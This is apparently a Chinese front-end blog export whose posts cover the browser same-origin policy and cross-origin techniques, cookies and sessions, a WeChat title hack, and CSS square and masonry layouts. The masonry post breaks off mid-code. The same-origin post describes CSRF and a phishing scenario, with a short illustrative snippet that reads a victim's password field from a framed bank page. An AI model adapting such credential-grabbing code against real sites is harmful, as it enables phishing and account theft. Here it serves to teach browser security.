    <content type="text"><![CDATA[什么是同源策略 首先来看一个比较官方的定义（浏览器的同源策略 ）：同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。 这是一个安全机制，假设我们没有这个安全机制会发生什么？ 没有同源策略的三个危险场景 这里只展示三个知道的场景，应该没有其它场景除非浏览器有所改变，如有其它场景可在文末补充。 没有同源策略限制的接口请求 设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？ 很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。 由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了 有一个小小的东西叫cookie大家应该知道，一般用来处理登录等场景，目的是让服务端知道谁发出的这次请求。如果你请求了接口进行登录，服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中，服务端就能知道这个用户已经登录过了。知道这个之后，我们来看场景： 你准备去清空你的购物车，于是打开了买买买网站 www.maimaimai.com ，然后登录成功，一看，购物车东西这么少，不行，还得买多点。 你在看有什么东西买的过程中，你的好基友发给你一个链接 www.nidongde.com ，一脸yin笑地跟你说：“你懂的”，你毫不犹豫打开了。 你饶有兴致地浏览着 www.nidongde.com ，谁知这个网站暗地里做了些不可描述的事情！由于没有同源策略的限制，它向 www.maimaimai.com 发起了请求！聪明的你一定想到上面的话“服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中”，这样一来，这个不法网站就相当于登录了你的账号，可以为所欲为了！如果这不是一个买买买账号，而是你的银行账号，那……这就是传说中的CSRF攻击 浅谈CSRF攻击方式。看了这波CSRF攻击我在想，即使有了同源策略限制，但cookie是明文的，还不是一样能拿下来。于是我看了一些cookie相关的文章聊一聊 cookie、Cookie/Session的机制与安全，知道了服务端可以设置httpOnly，使得前端无法操作cookie，如果没有这样的设置，像XSS攻击就可以去获取到cookie Web安全测试之XSS；设置secure，则保证在https的加密通信中传输以防截获。 没有同源策略限制的Dom查询 有一天你刚睡醒，收到一封邮件，说是你的银行账号有风险，赶紧点进 www.yinghang.com 改密码。你吓尿了，赶紧点进去，还是熟悉的银行登录界面，你果断输入你的账号密码，登录进去看看钱有没有少了。 睡眼朦胧的你没看清楚，平时访问的银行网站是 www.yinhang.com ，而现在访问的是 www.yinghang.com ，这个钓鱼网站做了什么呢？ 1 &lt;iframe name="yinhang" src="www.yinhang.com"&gt;&lt;/iframe&gt; 1234 // 由于没有同源策略的限制，钓鱼网站可以直接拿到别的网站的Domconst iframe = window.frames['yinhang']const node = iframe.document.getElementById('你输入账号密码的Input')console.log(`拿到了这个$&#123;node&#125;，我还拿不到你刚刚输入的账号密码吗`) 由此我们知道，同源策略确实能规避一些危险，不是说有了同源策略就安全，只是说同源策略是一种浏览器最基本的安全机制，毕竟能提高一点攻击的成本。其实没有刺不穿的盾，只是攻击的成本和攻击成功后获得的利益成不成正比。 没有同源策略的数据存储 数据存储中的数据虽然没有cookie那么重要，但是也是用户的个人，里面会记录用户的个人行为；假如个人行为泄露会影响用户的生活，有骚扰短信、营销电话、推荐邮件等方式 有同源策略的情况 有了同源策略上面的三个问题就可以避免掉（有些情况还是不能避免的），而且遵守同源策略的规则是可以适当做到跨域的。 同源的定义 1995年，同源策略由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个策略。 如果两个页面的协议，端口（如果有指定）和主机都相同，则两个页面具有相同的源 下表给出了相对http://store.company.com/dir/page.html同源检测的示例: URL 结果 原因 http://store.company.com/dir2/other.html 成功 只有路径不同 http://store.company.com/dir/inner/another.html 成功 只有路径不同 https://store.company.com/secure.html 失败 不同协议 ( https和http ) http://store.company.com:81/dir/etc.html 失败 不同端口 ( http:// 80是默认的) http://news.company.com/dir/other.html 失败 不同域名 ( news和store ) 另请参见文件的源定义: URLs 源的更改 比较官方的说法：脚本可以将 document.domain 的值设置为其当前域或其当前域的父域。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。 假设 http://store.company.com/dir/other.html 文档中的一个脚本执行以下语句： 1 document.domain = "company.com"; 这条语句执行之后，页面将会成功地通过对 http://company.com/dir/page.html 的同源检测（假设http://company.com/dir/page.html 将其 document.domain 设置为“company.com”，以表明它希望允许这样做 ）。然而，company.com 不能设置 document.domain 为 othercompany.com，因为它不是 company.com 的父域。 端口号是由浏览器另行检查的。任何对document.domain的赋值操作，包括 document.domain = document.domain 都会导致端口号被重写为 null 。因此 company.com:8080 不能仅通过设置 document.domain = &quot;company.com&quot; 来与company.com 通信。必须在他们双方中都进行赋值，以确保端口号都为 null 。 使用 document.domain 来允许子域安全访问其父域时，您需要在父域和子域中设置 document.domain 为相同的值。不这样做可能会导致权限错误。 跨源访问 根据上面说的三种异常情况主要分为以下三种跨源访问： 跨源网络访问同源策略控制了不同源之间的交互，例如在使用XMLHttpRequest会受到同源策略的约束。 跨源脚本API访问Javascript的APIs中，如 iframe.contentWindow, window.parent, window.open 和 window.opener 允许文档间直接相互引用。当两个文档的源不同时，这些引用方式将对 Window 和 Location对象的访问添加限制 跨源数据存储访问存储在浏览器中的数据，如Storage、IndexedDB、Cookie等。 跨源网络访问 同源策略控制了不同源之间的交互。例如在使用XMLHttpRequest会受到同源策略的约束，可使用一些方法允许跨域的方法。同时还有允许跨源的元素。而且跨源网络访问是跨源里面的常见问题。 这些交互通常分为三类： 通常允许跨域写操作（Cross-origin writes）。例如链接（links但在使用其中的属性download时需要同源），重定向以及表单提交。特定少数的HTTP请求需要添加 preflight。 通常允许跨域资源嵌入（Cross-origin embedding）。之后下面会举例说明。 通常不允许跨域读操作（Cross-origin reads）。但常可以通过内嵌资源来巧妙的进行读取访问。 允许跨域资源嵌入的元素与示例 &lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。 &lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。 &lt;img>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,… &lt;video> 和 &lt;audio>嵌入多媒体资源。 &lt;object>, &lt;embed> 和 &lt;applet> 的插件。 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。 &lt;frame> 和 &lt;iframe> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 如何允许跨源访问 当前网络环境下不允许跨源网络访问的只有XMLHttpRequest，因为 ajax 使用的就是 XMLHttpRequest，因此单独开辟一篇文章介绍ajax 跨域 如何阻止跨源访问 阻止跨域写操作，只要检测请求中的一个不可测的标记(CSRF token)即可，这个标记被称为Cross-Site Request Forgery (CSRF) 标记。必须使用这个标记来阻止页面的跨站读操作。 阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。 阻止跨站嵌入，需要确保你的资源不能是以上列出的可嵌入资源格式。多数情况下浏览器都不会遵守 Conten-Type 消息头。例如，如果您在HTML文档中指定 &lt;script\&gt; 标记，则浏览器将尝试将HTML解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入 X-Frame-Options阻止iframe的嵌套可以在nginx中设置nginx配置X-Frame-Options响应头 这里引申出另外一个问题，防盗链。参考防盗链 CSRF参考浅谈CSRF canvas操作图片的跨域问题 解决canvas图片getImageData,toDataURL跨域问题 跨源脚本API访问 Javascript的APIs中，如 iframe.contentWindow, window.parent, window.open 和 window.opener 允许文档间直接相互引用。当两个文档的源不同时，这些引用方式将对 Window 和 Location对象的访问添加限制。 允许以下对 Window 属性的跨源访问 方法 window.blur window.close window.focus window.postMessage 属性 window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window 允许以下对 Location 属性的跨源访问 方法 location.replace 属性 URLUtils.href 如果两个网页不同源，就无法拿到对方的DOM。典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口无法通信。 比如，父窗口运行下面的命令，如果iframe窗口不是同源，就会报错。 12 document.getElementById("myIFrame").contentWindow.document// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. 上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。反之亦然，子窗口获取主窗口的DOM也会报错。 可通过以下几个方法完成跨源 使用 window.postMessage 跨源 这个方法为什么放在这里，是因为该方法是最应该使用的方法，后面的方法都是小道而。 window.postMessage() 是HTML5的一个接口，专注实现不同窗口不同页面的跨域通讯。 这里是http://localhost:9099/#/crossDomain，发消息方 123456789101112131415161718192021222324252627 &lt;template&gt; &lt;div&gt; &lt;button @click="postMessage"&gt;给http://crossDomain.com:9099发消息&lt;/button&gt; &lt;iframe name="crossDomainIframe" src="http://crossdomain.com:9099"&gt;&lt;/iframe&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123; // 这里一定要对来源做校验 if (e.origin === 'http://crossdomain.com:9099') &#123; // 来自http://crossdomain.com:9099的结果回复 console.log(e.data) &#125; &#125;) &#125;, methods: &#123; // 向http://crossdomain.com:9099发消息 postMessage () &#123; const iframe = window.frames['crossDomainIframe'] iframe.postMessage('我是[http://localhost:9099], 麻烦你查一下你那边有没有id为app的Dom', 'http://crossdomain.com:9099') &#125; &#125;&#125;&lt;/script&gt; 这里是http://crossdomain.com:9099，接收消息方 12345678910111213141516171819202122 &lt;template&gt; &lt;div&gt; 我是http://crossdomain.com:9099 &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; mounted () &#123; window.addEventListener('message', (e) =&gt; &#123; // 这里一定要对来源做校验 if (e.origin === 'http://localhost:9099') &#123; // http://localhost:9099发来的信息 console.log(e.data) // e.source可以是回信的对象，其实就是http://localhost:9099窗口对象(window)的引用 // e.origin可以作为targetOrigin e.source.postMessage(`我是[http://crossdomain.com:9099]，我知道了兄弟，这就是你想知道的结果：$&#123;document.getElementById('app') ? '有id为app的Dom' : '没有id为app的Dom'&#125;`, e.origin); &#125; &#125;) &#125;&#125;&lt;/script&gt; 结果可以看到 使用 document.domain 跨源 该方法的使用过程在源的更改一节已经讲过，这个方法是有限制的，只能是子域名设置为父域名 使用 URL 锚点标记 URL锚点标记是URL的#号及其后面的部分，#之后的部分（也称为片段标识符） 父窗口可以把信息，写入子窗口的片段标识符。 12 var src = originURL + '#' + data;document.getElementById('myIFrame').src = src; 子窗口通过监听hashchange事件得到通知。 1234 window.onhashchange = function checkMessage() &#123; var message = window.location.hash; // ...&#125; 同样的，子窗口也可以改变父窗口的片段标识符。 1 parent.location.href= target + "#" + hash; 父窗口也同样通过监听hashchange事件得到通知。 使用 window.name 属性 浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。 跨源数据存储访问 存储在浏览器中的数据，如Storage、IndexedDB、以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。 这两个可以在iframe中根据情况使用跨源API访问的四种方法取Storage中的值，还是推荐使用postMessage方式。 Cookies 使用不同的源定义方式。一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix）即可（举例说明下：如果页面域名为 www.baidu.com, domain可以设置为“ www.baidu.com”，也可以设置为“baidu.com”，但不能设置为“.com”或“com”）。Firefox 和 Chrome 使用 Public Suffix List 决定一个域是否是一个公共后缀（public suffix）。Internet Explorer使用其自己的内部方法来确定域是否是公共后缀。不管使用哪个协议（HTTP/HTTPS）或端口号，浏览器都允许给定的域以及其任何子域名(sub-domains) 访问 cookie。设置 cookie 时，你可以使用Domain，Path，Secure，和Http-Only标记来限定其访问性。 cookie跨域的方式如果只是简单的跨域可以设置cookie的domain为一级域名，所有的子域名都可以使用。 如果是复杂的跨域，只能是在iframe中根据情况使用跨源API访问的postMessage和锚点标记。 不使用document.domain是因为可以通过一级域名的方式，如果感觉使用这种方式比较开心，也可以使用。 总结 允许跨源访问的元素：script、link、img、video、audio、object、embed、applet、@font-face、frame、iframe。 ajax跨域的解决方法：可跨源的元素、JSONP、CORS、Nginx、WebSocket。 如何跨源脚本API访问：postMessage、document.domain、片段标识符、window.name。 如何跨源数据存储访问：postMessage、document.domain、片段标识符、window.name、设置父域cookie（cookie专用） 参考 浏览器的同源策略 档案同源策略 Cross-Origin Resource Sharing (CORS) 不要再问我跨域的问题了浏览器同源政策及其规避方法跨域资源共享 CORS 详解 Identifying resources on the Web]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>跨域</tag>
        <tag>同源</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cookie与session]]></title>
    <url>%2Fblob%2F2019-04-01-cookie-and-session%2F</url>
    <content type="text"><![CDATA[Cookie cookie的相关内容查看cookie 简介 Session Session的内容已经在 cookie 中提及，只是没有详细的说明。具体来说就是在HTTP协议之上，通过Cookie实现了持久的会话。这个会话便称为Session。通常这个 cookie 叫 jsessionid。 Session 是存储在服务器端的，避免了在客户端Cookie中存储敏感数据。 Session 可以存储在HTTP服务器的内存中，也可以存在内存数据库（如redis）中， 对于重量级的应用甚至可以存储在数据库中。 服务器在登录之后设置请求头 Set-Cookie 属性让浏览器保存当前 cookie，在随后向同一服务器发送的请求根据 Domain Path 来确定发送那些 cookie。 参考 讲解：https://harttle.land/2015/08/10/cookie-session.html#header-2MDN HTTP Cookie：https://developer.mozilla.org/en-US/docs/Web/HTTP/CookiesMDN HTTP Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CookiesMDN HTTP Headers Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/CookieMDN Set-Cookie：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-CookieMDN Document Cookie：https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie聊一聊 cookie：https://segmentfault.com/a/1190000004556040#articleHeader6 深入了解浏览器存储–从cookie到WebStorage、IndexedDB：https://segmentfault.com/a/1190000018748168?utm_source=weekly&amp;utm_medium=email&amp;utm_campaign=email_weekly]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>cookie</tag>
        <tag>session</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hack在微信等webview中无法修改document.title的情况]]></title>
    <url>%2Fblob%2F2019-03-28-hack-can't-modify-document.-title-in-webview-such-as-wechat%2F</url>
    <content type="text"><![CDATA[今天使用了很久以前发现的一个在IOS中动态设置document.title无效的问题，本打算直接去使用上一个记录的内容，发现因为没有引入JQuery无法使用，而且网上还没有原生js的方法，所以在此记录一下，其原理都是利用iframe的加载可以局部刷新页面，从而使&lt;title>被重新渲染。。 作为一个与时俱进的软甲开发者，我们不能局限于框架，放眼底层原理才是王道。 原生js版本 1234567891011121314151617181920 document.title = titleconst body = document.querySelector('body')// hack在微信等webview中无法修改document.title的情况let iframe = document.createElement('iframe')iframe.src = '/favicon.ico'const setTitle = () =&gt; &#123; setTimeout(function () &#123; iframe.removeEventListener('load', setTitle, false) body.removeChild(iframe) iframe = undefined &#125;, 0)&#125;iframe.addEventListener('load', setTitle, false)body.appendChild(iframe) 原生js版本 此为在网上找到的版本，比我自己写的简单明了 123456789101112131415 setTimeout(function () &#123;// 利用iframe的onload事件刷新页面 document.title = title let iframe = document.createElement('iframe') iframe.style.visibility = 'hidden' iframe.style.width = '1px' iframe.style.height = '1px' iframe.onload = function () &#123; setTimeout(function () &#123; document.body.removeChild(iframe) iframe = undefined &#125;, 0) &#125; document.body.appendChild(iframe)&#125;, 0) JQuery 版本 12345678 var $body = $('body');document.title = '确认车牌';// hack在微信等webview中无法修改document.title的情况var $iframe = $('&lt;iframe src="/favicon.ico"&gt;&lt;/iframe&gt;').on('load', function() &#123; setTimeout(function() &#123; $iframe.off('load').remove(); &#125;, 0)&#125;).appendTo($body);]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>title</tag>
        <tag>微信</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让div的高度等于宽度]]></title>
    <url>%2Fblob%2F2019-03-27-how-to-make-the-height-of-div-equal-to-the-width%2F</url>
    <content type="text"><![CDATA[引子 今天在开发时遇到一个问题，如何使高度等于百分比的宽度。原本的想法是通过js获取，但是这个方法感觉太麻烦，希望能用css做的事情就不要js去做。 解惑 通过查找发现，有js去做的，这样做是后期处理修改宽度值，不建议这样做。 完美的方案是通过padding来实现的，通过查找MDN找到了发现了其中的原由，也是平时被我忽略的地方。 首先看MDN对padding是如何定义的（截取部分）： ENThe padding CSS property sets the padding area on all four sides of an element. It is a shorthand for padding-top, padding-right, padding-bottom, and padding-left. Values&lt;length>The size of the padding as a fixed value.&lt;percentage>The size of the padding as a percentage, relative to the width of the containing block. ZHpadding属性设置一个元素的内边距，padding 区域指一个元素的内容和其边界之间的空间，该属性不能为负值。 取值&lt;长度&gt;可指定非负的固定宽度. See &lt;length> for details.&lt;百分比&gt;相对于包含块的宽度 这一段最终给我们传递了什么意思呢？看最后一句话“相对于包含块的宽度”，意思是padding的百分比基数是包含块的宽度（父元素的宽度），如果父元素是100px，padding-top: 20%;就相当于padding-top: 20px，这是一个值得学习的特性，多用于移动端的适配问题。 应用 接下来根据这一特性开始实现让div的高度等于宽度。 假设是一个div占据屏幕中间90%的区域显示，图片比例是1:1。 首先画一个90%宽，比例为1:1的区域 1234 width: 90%;height: 0;margin: 0 auto;padding-top: 90%; 图片要放置在这个区域，但是发现高度为0，通过绝对定位实现， 12345 position: absolute;width: 100%;height: 100%;top: 0;left: 0; 这时候发现有的同学使用padding-bottom，原因是这样不需要top和left属性（道理自己想吧）。 假设现在的图片比例是4:3，我们要怎么计算呢 90% / 4 * 3 = 67.5%，其他比例安装这个公式去计算就好。 下面是完整的代码和截取的一个小栗子： 123 &lt;div class="banner"&gt; &lt;img src="xxx.png"/&gt;&lt;/div&gt; 12345678910111213 .banner&#123; width: 90%; height: 0; margin: 0 auto; padding-bottom: 90%; /*1:1*/ padding-bottom: 67.5%; /*4:3*/ position: relative;&#125;.banner &gt; img&#123; position: absolute; width: 100%; height: 100%;&#125; 参考 https://www.cnblogs.com/summer-work/p/6511835.htmlhttp://www.imooc.com/wenda/detail/317720https://blog.csdn.net/weixin_41534645/article/details/79734635 https://developer.mozilla.org/zh-CN/docs/Web/CSS/paddinghttps://developer.mozilla.org/en-US/docs/Web/CSS/padding]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>高度等于宽度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[瀑布流布局实现]]></title>
    <url>%2Fblob%2F2019-03-26-realization-of-waterfall-flow-layout%2F</url>
    <content type="text"><![CDATA[JS实现 首先 https://github.com/desandro/masonry 是一个很好的插件，是一个比较不错的方案，使用的是绝对定位。 npm 使用方法，其他使用方法查看官网 1 npm i -D masonry-layout 12345 &lt;div class="grid"&gt; &lt;div class="grid-item"&gt;&lt;/div&gt; &lt;div class="grid-item grid-item--height1"&gt;&lt;/div&gt; &lt;div class="grid-item grid-item--height2"&gt;&lt;/div&gt;&lt;/div&gt; 123456789 .grid-item &#123; float: left; width: 200px; height: 60px; border: 2px solid hsla(0, 0%, 0%, 0.5);&#125;.grid-item--height1 &#123; height: 160px; &#125;.grid-item--height2 &#123; height: 140px; &#125; 123456 import Masonry from 'masonry-layout'const msnry = new Masonry('.grid', &#123; itemSelector: '.grid-item', columnWidth: 200,&#125;) 此代码库通过https://segmentfault.com/a/1190000013675077 找到 除了 https://github.com/desandro/masonry 还有 https://github.com/metafizzy/isotope ，用法都很简单。 CSS实现 不管是使用float还是inline-block布局都无法很好的控制列表项目堆栈之间的间距。最终得到的效果就像下面这样： css实现从 https://www.w3cplus.com/css/pure-css-create-masonry-layout.html 处学习到，分三种Multi-columns、Flexbox、Grid，之所以为选择这三种方式，因为对这三种属性在手机端的兼容性的不了解，所以未使用此方案。下面展示这几种的使用方法，顺便加入一点自己的理解。 瀑布流布局有一个专业的英文名称Masonry Layouts。瀑布流布局已经有好多年的历史了，我最早知道这个名词的时候大约是在2012年，当时Pinterest网站的布局就是使用的这种流式布局，简言之像Pinterest网站这样的布局就称之为瀑布流布局，也有人称之为Pinterest 布局。 瀑布流布局其核心是基于一个网格的布局，而且每行包含的项目列表高度是随机的（随着自己内容动态变化高度），同时每个项目列表呈堆栈形式排列，最为关键的是，堆栈之间彼此之间没有多余的间距差存大 Multi-columns 首先最早尝试使用纯CSS方法解决瀑布流布局的是CSS3 的Multi-columns。其最早只是用来用来实现文本多列排列（类似报纸杂志样的文本排列）。但对于前端同学来说，他们都是非常具有创意和创新的，有人尝试通过Multi-columns相关的属性column-count、column-gap配合break-inside来实现瀑布流布局。 比如我们有一个类似这样的HTML结构: 1234567891011 &lt;div class="masonry"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- more items --&gt;&lt;/div&gt; 其中div.masonry是瀑布流的容器，其里面放置了n个列表div.item。为了节约篇幅，上面代码仅列了两个。结构有了，现在来看CSS。在.masonry中设置column-count和column-gap，前者用来设置列数，后者设置列间距： 1234 .masonry &#123; column-count: 5; column-gap: 0;&#125; 上面控制了列与列之间的效果，但这并不是最关键之处。当初纯CSS实现瀑布流布局中最关键的是堆栈之间的间距，而并非列与列之间的控制（说句实话，列与列之间的控制float之类的就能很好的实现）。找到实现痛楚，那就好办了。或许你会问有什么CSS方法可以解决这个。在CSS中有一个break-inside属性，这个属性也是实现瀑布流布局最关键的属性。 12345 .item &#123; break-inside: avoid; box-sizing: border-box; padding: 10px;&#125; 其中break-inside:avoid为了控制文本块分解成单独的列，以免项目列表的内容跨列，破坏整体的布局。当然为了布局具有响应式效果，可以借助媒体查询属性，在不同的条件下使用column-count设置不同的列，比如： 1234567891011121314 .masonry &#123; column-count: 1; // one column on mobile&#125;@media (min-width: 400px) &#123; .masonry &#123; column-count: 2; // two columns on larger phones &#125;&#125;@media (min-width: 1200px) &#123; .masonry &#123; column-count: 3; // three columns on...you get it &#125;&#125;&lt;!-- etc. --&gt; 下面是完整例子和效果图： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 &lt;div class="masonry"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113 @import url('https://fonts.googleapis.com/css?family=PT+Mono');$bg: #4F000B;$itemBg1: #720026;$itemBg2: #CE4257;$itemBg3: #FFC093;$itemBg4: #FF7F51;$counterBg: #222;@mixin setColorAndHover($baseColor) &#123; color: $baseColor; &amp;:hover &#123; background: lighten($baseColor, 8%); &#125;&#125;body,html &#123; position: relative; width: 100%; height: 100%; background: $bg; font-family: "PT Mono", monospace;&#125;.masonry &#123; column-count: 1; column-gap: 0; counter-reset: item-counter; @media screen and (min-width: 400px) &#123; column-count: 2; &#125; @media screen and (min-width: 600px) &#123; column-count: 3; &#125; @media screen and (min-width: 800px) &#123; column-count: 4; &#125; @media screen and (min-width: 1100px) &#123; column-count: 5; &#125;&#125;.item &#123; box-sizing: border-box; break-inside: avoid; padding: 10px; counter-increment: item-counter; &amp;__content &#123; position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 220px; font-size: 40px; color: darken($bg, 5%); background: currentColor; box-sizing: border-box; @include setColorAndHover($itemBg1); &amp;:before &#123; position: absolute; top: 0; left: 0; font-size: 13px; width: 2em; height: 2em; line-height: 2em; text-align: center; font-weight: bold; background-color: $counterBg; content: counter(item-counter); &#125; &amp;:after &#123; color: darken($bg, 10%); content: 'ಠ‿ಠ'; &#125; &amp;--small &#123; @include setColorAndHover($itemBg2); height: 100px; &amp;:after &#123; content: '♥◡♥'; &#125; &#125; &amp;--medium &#123; @include setColorAndHover($itemBg3); height: 175px; &amp;:after &#123; content: '◔ᴗ◔'; &#125; &#125; &amp;--large &#123; @include setColorAndHover($itemBg4); height: 280px; &amp;:after &#123; content: 'ಠ_๏'; &#125; &#125; &#125;&#125; 从结果来看，此方法没有使item水平方向布局 Flexbox Flexbox布局到今天已经是使用非常广泛的，也算是很成熟的一个特性。那接下来我们就看Flexbox怎么实现瀑布流布局。如果你从未接触过Flexbox相关的属性，那建议你点击这里阅读。如果你觉得这里信息量过于太多，那强列建议你阅读下面几篇文章，阅读完之后你对Flexbox相关属性会有一个彻底的了解： 一个完整的Flexbox指南图解CSS3 Flexbox属性理解Flexbox：你需要知道的一切 终极Flexbox属性查询列表Flexbox布局实战深入理解 flex 布局以及计算 上面这几篇文章告诉了你有关于Flexbox的一切： 接下来回到我们今天的正题当中，使用Flexbox实现瀑布流布局有两种方案。 一个主要的列容器 结构依旧和Multi-columns小节中展示的一样。只是在.masonry容器中使用的CSS不一样： 123456 .masonry &#123; display: flex; flex-flow: column wrap; width: 100%; height: 800px;&#125; 之前在.masonry中是通过column-count来控制列，这里采用flex-flow来控制列，并且允许它换行。这里关键是容器的高度，示例中显式的设置了height属性，当然除了设置px值，还可以设置100vh，让.masonry容器的高度和浏览器视窗高度一样。记住，这里height可以设置成任何高度值（采用任何的单位），但不能不显式的设置，如果没有显式的设置，容器就无法包裹住项目列表。 使用Flexbox布局，对于.item可以不再使用break-inside:avoid，但其它属性可以是一样。同样的，响应式设置，使用Flexbox实现响应式布局比多列布局要来得容易，他天生就具备这方面的能力，只不过我们这里需要对容器的高度做相关的处理。前面也提到过了，如果不给.masonry容器显式设置高度是无法包裹项目列表的，那么这里响应式设计中就需要在不同的媒体查询条件下设置不同的高度值： 123456789101112131415161718192021222324252627 .masonry &#123; height: auto;&#125;@media screen and (min-width: 400px) &#123; .masonry &#123; height: 1600px; &#125;&#125;@media screen and (min-width: 600px) &#123; .masonry &#123; height: 1300px; &#125;&#125;@media screen and (min-width: 800px) &#123; .masonry &#123; height: 1100px; &#125;&#125;@media screen and (min-width: 1100px) &#123; .masonry &#123; height: 800px; &#125;&#125; 同样来看一个示例效果（完整的代码和效果）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 &lt;div class="masonry"&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--medium"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--small"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="item"&gt; &lt;div class="item__content item__content--large"&gt; 